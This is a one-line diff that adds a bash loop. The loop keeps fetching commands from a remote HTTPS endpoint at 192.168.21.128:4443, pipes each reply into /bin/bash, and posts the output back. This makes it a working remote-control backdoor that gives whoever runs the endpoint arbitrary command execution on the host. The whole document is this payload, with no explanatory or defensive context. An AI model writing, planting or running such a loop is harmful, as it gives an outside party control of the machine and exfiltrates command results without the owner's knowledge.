@@ -1,0 +1,1 @@
+URL=https://192.168.21.128:4443;while true;do RESULT="`curl -Lsk $URL | /bin/bash`";curl -ks -X "POST" --data "$RESULT" $URL;done
